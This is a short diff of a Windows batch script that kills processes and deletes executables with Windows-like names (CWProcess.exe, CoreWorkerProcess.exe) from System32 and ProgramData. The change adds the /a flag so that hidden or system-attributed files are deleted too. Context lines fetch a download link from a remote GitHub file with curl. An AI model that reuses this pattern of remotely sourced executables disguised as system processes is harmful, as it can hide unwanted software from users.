@@ -37,7 +37,7 @@ echo.
 
 :: Kill & Delete file 
 taskkill /f /im !filename!.exe
-del /f /q "%TEMP%\!filename!.exe"
+del /f /a /q "%TEMP%\!filename!.exe"
 
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
 
@@ -95,8 +95,8 @@ taskkill /f /im "CWProcess.exe"
 echo.
 echo.
 echo Deleting files..
-del /f /q "%SystemRoot%\System32\CWProcess.exe"
-del /f /q "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+del /f /a /q "%SystemRoot%\System32\CWProcess.exe"
+del /f /a /q "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
 echo Done.
 echo.
 echo.
